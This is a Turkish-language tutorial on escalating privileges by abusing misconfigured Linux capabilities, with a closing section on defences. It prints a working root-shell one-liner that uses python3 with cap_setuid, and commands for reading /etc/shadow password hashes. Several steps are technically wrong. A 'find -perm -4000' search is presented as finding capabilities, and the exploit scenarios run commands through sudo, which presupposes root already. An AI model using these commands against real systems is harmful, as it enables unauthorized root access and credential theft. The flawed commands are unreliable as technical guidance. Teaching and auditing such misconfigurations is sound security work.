### Linux Capabilities ile Privilege Escalation (Yetki Yükseltme) Rehberi

Linux Capabilities, işlemlere root yetkilerinin bir alt kümesini atamaya olanak tanır. Ancak, bu yetkiler yanlış yapılandırıldığında, yetki yükseltme için kullanılabilir. Bu rehberde, Linux Capabilities kullanılarak nasıl yetki yükseltme yapılacağını adım adım açıklayacağız.

---

#### 1. **Linux Capabilities Nedir?**
Linux Capabilities, geleneksel süper kullanıcı (root) yetkilerini ayrıcalıklı işlemlere bölerek daha ince bir kontrol sağlar. Bazı yaygın yetenekler şunlardır:

- `CAP_CHOWN`: Dosya sahipliğini değiştirme.
- `CAP_DAC_OVERRIDE`: Dosya izinlerini göz ardı etme.
- `CAP_NET_RAW`: Ham soket işlemleri yapma.

---

#### 2. **Capabilities Kontrolü**
Bir dosyanın hangi capabilities'e sahip olduğunu kontrol etmek için şu komut kullanılabilir:
```bash
getcap <dosya_yolu>
```
Örnek:
```bash
getcap /usr/bin/python3
```
Eğer çıktı şunu gösteriyorsa:
```
/usr/bin/python3 = cap_setuid+ep
```
Bu, dosyanın `CAP_SETUID` yeteneğine sahip olduğunu belirtir.

---

#### 3. **Yetki Yükseltme için Gereken Adımlar**

##### Adım 1: **Yeteneği Belirleme**
Sistemdeki tüm dosyaların capabilities değerlerini listelemek için şu komut kullanılabilir:
```bash
find / -type f -perm -4000 -exec getcap {} + 2>/dev/null
```
Bu komut, `capabilities` atanmış dosyaları arar.

##### Adım 2: **Yanlış Yapılandırmayı Analiz Etme**
Bazı capabilities, root yetkisi kazanmak için kullanılabilir:

- **`CAP_SETUID` veya `CAP_SETGID`:**
  Bu yeteneklere sahip bir dosya, UID/GID değiştirme yetkisine sahiptir.

- **`CAP_DAC_READ_SEARCH`:**
  Bu yetenek, izin kısıtlamalarını göz ardı ederek dosya ve dizinlere erişim sağlar.

##### Adım 3: **Exploit Etme**
Örneğin, `CAP_SETUID` yeteneği atanmış bir dosya ile:
1. Yeteneği kontrol edin:
    ```bash
    getcap /bin/python3
    ```
    Çıktı:
    ```
    /bin/python3 = cap_setuid+ep
    ```
2. Bu dosyayı kullanarak bir shell açın:
    ```bash
    /bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
    ```

---

#### 4. **Yaygın Saldırı Senaryoları**

##### Senaryo 1: `CAP_NET_RAW` ile Ham Soket Erişimi
Bu yetenek, ham soket oluşturulmasına izin verir ve bazen root yetkisi elde etmek için kullanılabilir.

**Exploit:**
Bir ağ dinleyicisi oluşturmak için şu adımları izleyebilirsiniz:
```bash
getcap /usr/bin/tcpdump
/usr/bin/tcpdump = cap_net_raw+ep
sudo /usr/bin/tcpdump -i lo
```
Bu işlemle ağ trafiğini dinleme yetkisi elde edersiniz.

##### Senaryo 2: `CAP_DAC_OVERRIDE` ile Dosya İzinlerini Aşma
Bu yetenek, dosya izinlerini atlayarak hassas dosyaları okumayı sağlar.

**Exploit:**
```bash
getcap /bin/cat
/bin/cat = cap_dac_override+ep
sudo /bin/cat /etc/shadow
```
Bu işlem, şifre hash'lerini okumanıza olanak tanır.

---

#### 5. **Savunma Yöntemleri**
Linux Capabilities tabanlı yetki yükseltme saldırılarından korunmak için:

1. **Capabilities Atamalarını Gözden Geçirin:**
   Sistemdeki capabilities'leri düzenli olarak kontrol edin:
   ```bash
   getcap -r /
   ```

2. **Gereksiz Yetkileri Kaldırın:**
   Yanlış yapılandırılmış capabilities'i kaldırmak için şu komut kullanılabilir:
   ```bash
   setcap -r <dosya_yolu>
   ```

3. **Dosya İzinlerini Kontrol Edin:**
   Hassas dosyaların yalnızca yetkili kullanıcılar tarafından erişilebilir olduğundan emin olun.

4. **Logları İnceleyin:**
   Güvenlik olaylarını tespit etmek için sistem loglarını düzenli olarak kontrol edin.

5. **Kernel Güncellemelerini Yükleyin:**
   Kernel'deki capabilities ile ilgili güvenlik açıklarını gidermek için sisteminizi güncel tutun.

---

Bu rehberde, Linux Capabilities'in nasıl yetki yükseltme için kullanılabileceğini ve bu tür saldırılara karşı nasıl savunma yapılacağını öğrendiniz. Etik kurallar çerçevesinde çalışmayı unutmayın.

